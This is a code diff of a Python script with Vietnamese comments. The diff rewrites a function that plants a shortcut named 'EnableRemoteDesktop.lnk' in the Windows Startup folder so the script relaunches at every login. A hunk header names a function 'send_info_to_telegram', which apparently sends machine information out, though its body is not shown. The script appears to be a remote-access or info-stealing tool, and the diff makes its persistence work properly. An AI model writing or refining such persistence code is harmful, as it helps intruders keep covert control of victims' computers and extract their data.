@@ -1,5 +1,5 @@
 import subprocess
-
+import os
 import sys
 import ctypes
 
@@ -103,28 +103,27 @@ def send_info_to_telegram():
 
 import os
 import shutil
-
+import win32com.client
 def create_startup_shortcut():
     try:
-        # Đường dẫn file script
-        script_path = os.path.abspath(__file__)
+        script_path = os.path.abspath(__file__)  # Đường dẫn script
 
         # Thư mục Startup
         startup_dir = os.path.expandvars(r"%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup")
-
-        # Tên file shortcut
         shortcut_name = "EnableRemoteDesktop.lnk"
-
-        # Đường dẫn đầy đủ của shortcut
         shortcut_path = os.path.join(startup_dir, shortcut_name)
 
-        # Tạo shortcut
-        with open(shortcut_path, "w") as shortcut_file:
-            shortcut_file.write(f"pythonw {script_path}")
-        
+        # Tạo đối tượng shell
+        shell = win32com.client.Dispatch("WScript.Shell")
+        shortcut = shell.CreateShortcut(shortcut_path)
+        shortcut.TargetPath = sys.executable  # Đường dẫn đến Python
+        shortcut.Arguments = f'"{script_path}"'  # Chạy script của bạn
+        shortcut.WorkingDirectory = os.path.dirname(script_path)
+        shortcut.Save()
+
         print(f"Shortcut đã được tạo tại: {shortcut_path}")
     except Exception as e:
-        print(f"Lỗi khi tạo file khởi động: {e}")
+        print(f"Lỗi khi tạo shortcut: {e}")
 
 if __name__ == "__main__":
 
